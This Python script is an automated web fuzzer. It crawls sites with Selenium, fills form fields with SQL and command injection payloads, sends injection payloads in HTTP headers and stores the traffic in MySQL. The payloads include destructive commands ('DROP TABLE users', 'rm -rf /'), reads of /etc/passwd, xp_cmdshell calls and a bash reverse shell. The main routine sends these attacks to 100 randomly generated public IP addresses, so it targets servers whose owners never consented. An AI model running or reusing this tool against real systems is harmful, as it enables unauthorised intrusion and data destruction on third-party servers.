import os
import time
import mysql.connector
from seleniumwire import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.by import By
from dotenv import load_dotenv
import random
from urllib.parse import urlparse
import threading
import json 

# Load credentials from .env file
load_dotenv()

lock = threading.Lock()


# MySQL database connection
db_connection = mysql.connector.connect(
    host='127.0.0.1',
    user='root',
    password=os.getenv('MYSQL_PASSWORD'),
    database='web_analysis'
)
c_rsp = db_connection.cursor()
c_lrn = db_connection.cursor()
c_main = db_connection.cursor()



# Selenium WebDriver path
driver_path = os.getenv('CHROMEDRIVER_PATH')

def fuzz_parameters():
    """Generate unique SQL and command injection payloads."""
    fuzz_inputs = [
        "admin'--",  # SQL injection
        "'; DROP TABLE users; --",  # SQL injection
        "`; exec xp_cmdshell('dir'); --",  # Command injection
        "`; ls -la; --",  # Command injection
        "' OR '1'='1' --",  # SQL injection
        "1; SELECT version(); --",  # SQL injection
        "`; whoami; --",  # Command injection
        "`; rm -rf /; --",  # Command injection
        "'; exec master..xp_cmdshell('ping 127.0.0.1'); --",  # Command injection
        "' UNION SELECT NULL, NULL; --"  # SQL injection (union-based)
    ]
    return random.choice(fuzz_inputs)

def fuzz_headers():
    """Generate unique SQL and command injection payloads for headers."""
    fuzz_headers_list = [
        {"X-SQL-Inject": "' OR '1'='1"},  # SQL injection
        {"X-Command-Inject": "`; uname -a; --"},  # Command injection
        {"X-SQL-Comment": "admin'--"},  # SQL injection
        {"X-Command-Exec": "`; cat /etc/passwd; --"},  # Command injection
        {"X-SQL-Blind": "' AND SLEEP(5); --"},  # SQL injection (time-based blind)
        {"X-Command-Inject-Bash": "`; bash -i >& /dev/tcp/127.0.0.1/8080 0>&1; --"},  # Command injection (reverse shell)
        {"X-SQL-Union": "' UNION SELECT NULL, version(); --"},  # SQL injection (union-based)
        {"X-Command-Inject-Python": "`; python -c 'import os; os.system(\"id\")'; --"},  # Command injection (Python)
    ]
    return random.choice(fuzz_headers_list)


def apply_fuzzing_headers(driver):
    """Apply fuzzing headers using JavaScript."""
    headers = fuzz_headers()
    for header_name, header_value in headers.items():
        try:
            js_code = f"""
            var xhr = new XMLHttpRequest();
            xhr.open('POST', window.location.href, true);
            xhr.setRequestHeader('{header_name}', `{header_value}`);
            xhr.send();
            """
            driver.execute_script(js_code)
            time.sleep(3)
        except Exception as e:
            print(f"Header fuzzing error: {e}")

def decode_safe(data):
    """Safely decode data if it's in bytes, otherwise return it as is."""
    if isinstance(data, bytes):
        try:
            return data.decode('utf-8', errors='replace')
        except Exception as e:
            print(f"Decoding error: {e}")
            return "<DECODING_ERROR>"
    elif isinstance(data, str):
        return data
    else:
        print("Unsupported data type")
        return "<UNSUPPORTED_TYPE>"



def save_to_db(req_method, req_path, req_query, req_headers, req_body, res_status, res_headers, res_body):
    """Save request and response data to the database."""
     # Lock start
    lock.acquire()

    global id_counter
    # Get response_id and set id_counter (id_counter = max(res_id) + 1)
    try:
        c_lrn.execute('SELECT MAX(res_id) FROM http_response')
        id_counter = c_lrn.fetchall()[0][0] + 1
    except:
        id_counter = 1


    try:
        # Convert bytes to strings
        if isinstance(req_query, bytes):
            req_query = req_query.decode("utf-8")
        if isinstance(req_body, bytes):
            req_body = req_body.decode("utf-8")

        # Convert space to "#" for training word2vec 
        req_headers = req_headers.replace(" ", "#")
        req_body = req_body.replace(" ", "#")

        # Check if request body contains "form#did#not#exist#on#page"
        if "form#did#not#exist#on#page" in req_body:
            print("Skipping request with body: form#did#not#exist#on#page")
            return  # Skip further processing and database insertion


        # Handle response body processing
        try:
            if isinstance(res_body, bytes):
                if "html" in res_body.decode('utf-8', errors='ignore'):
                    res_body = res_body.decode('utf-8')
                    res_body = res_body.encode()

        except Exception as e:
            print(f"Error processing response body: {e}")

        # Convert dictionaries to JSON strings
        req_body_json = json.dumps(req_body) if isinstance(req_body, dict) else req_body
        res_body_json = json.dumps(res_body) if isinstance(res_body, dict) else res_body


        # Check if there is a matching response in the response table
        c_rsp.execute('SELECT res_id FROM http_response WHERE status = %s AND headers = %s AND body = %s', (res_status, res_headers, res_body_json))
        result = c_rsp.fetchall()

        if result:
            res_id = result[0][0]
        else:
            # Save a new response to the response table using id_counter
            sql_rsp = 'INSERT INTO http_response (res_id, status, headers, body) VALUES (%s, %s, %s, %s)'
            c_rsp.execute(sql_rsp, (id_counter, res_status, res_headers, res_body_json))
            res_id = id_counter

            id_counter += 1  # Increase response_id

        # Save the request to the request_data table with the response_id
        sql_req = 'INSERT INTO request_data (method, path, query, headers, body, res_id) VALUES (%s, %s, %s, %s, %s, %s)'
        c_lrn.execute(sql_req, (req_method, req_path, req_query, req_headers, req_body_json, res_id))

        # Commit the transaction
        db_connection.commit()

    except Exception as e:
        print(f"Failed to save to DB: {e}")

    finally:
        # Lock release
        lock.release()

def get_internal_links(driver, base_url):
    """Extract all internal links from the current page."""
    links = set()
    anchor_elements = driver.find_elements(By.TAG_NAME, "a")
    
    for element in anchor_elements:
        href = element.get_attribute("href")
        if href and href.startswith(base_url):
            links.add(href)
    
    return links

def crawl_by_selenium(url, driver, visited_urls):
    """Crawl and fuzz a website recursively."""
    if url in visited_urls:
        return
    
    print("[*] Accessing web server:", url)
    visited_urls.add(url)
    
    try:
        # Set a timeout for the page load
        driver.set_page_load_timeout(10)  # Timeout in seconds
        driver.get(url)
        time.sleep(10)  # Wait for the page to load completely
    except Exception as e:
        print(f"Error loading page or timeout occurred: {e}")
        return

    # Fuzz input fields and submit form
    input_fields = driver.find_elements(By.TAG_NAME, "input")
    form_data = {}
    form_found = False
    
    for field in input_fields:
        try:
            field_name = field.get_attribute('name')
            if field_name:
                form_found = True
                fuzz_input = fuzz_parameters()
                form_data[field_name] = fuzz_input
                field.send_keys(fuzz_input)
                ActionChains(driver).send_keys_to_element(field, fuzz_input).perform()
        except Exception as e:
            print(f"Fuzzing error: {e}")

    if form_found:
        try:
            forms = driver.find_elements(By.TAG_NAME, "form")
            if forms:
                form = forms[0]
                form.submit()  # Submit the first form found on the page
                print(f"[*] Submitted form with fuzzed data: {form_data}")
        except Exception as e:
            print(f"Form submission error: {e}")
    else:
        form_data = "form did not exist on page"

    apply_fuzzing_headers(driver)

    for request in driver.requests:
        if url in request.url:
            req_method = request.method
            req_path = request.path
            req_query = request.querystring if request.querystring else "<EMP>"
            req_headers = decode_safe(str(request.headers))
            req_body = decode_safe(request.body) if request.body else form_data
            print(f"Request Body: {req_body}") 

            try:
                res_status = int(request.response.status_code)
                res_headers = decode_safe(str(request.response.headers))
                res_body = decode_safe(request.response.body)
            except:
                res_status = 400
                res_headers = "<ERROR>"
                res_body = "Bad Request."

            save_to_db(req_method, req_path, req_query, req_headers, req_body, res_status, res_headers, res_body)

    internal_links = get_internal_links(driver, url)
    for link in internal_links:
        crawl_by_selenium(link, driver, visited_urls)

def generate_random_ip():
    """Generate a random valid IP address."""
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

def main():
    options = Options()
    options.headless = True
    service = Service(driver_path)

    max_attempts = 100  # Define how many IPs you want to test
    
    for _ in range(max_attempts):
        random_ip = generate_random_ip()
        url = f"http://{random_ip}"
        
        driver = webdriver.Chrome(service=service, options=options)
        visited_urls = set()

        try:
            crawl_by_selenium(url, driver, visited_urls)
        except Exception as e:
            print(f"Error while crawling {url}: {e}")
        finally:
            driver.quit()  # Ensure the browser is closed before moving on

        # Wait a bit before starting the next attempt (optional)
        time.sleep(2)
        # Thread Exclusion control
    
    
    c_lrn.close()
    c_rsp.close()
    db_connection.close()

if __name__ == "__main__":
    main()
